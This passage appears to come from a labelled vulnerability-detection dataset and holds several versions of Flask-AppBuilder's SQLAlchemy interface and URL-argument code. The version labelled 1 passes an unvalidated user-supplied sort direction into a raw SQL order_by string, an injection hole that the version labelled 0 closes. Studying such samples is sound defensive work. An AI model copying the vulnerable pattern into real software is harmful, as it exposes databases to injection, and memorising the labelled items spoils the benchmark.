get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/n/flask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 1}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(\"%s %s\" % (order_column, order_direction))\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/nflask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            order_direction = request.args.get('_od_' + re_match[0])\n            if order_direction in ('asc', 'desc'):\n                orders[re_match[0]] = (request.args.get(arg), order_direction)\n    return orders\n\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 0}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except 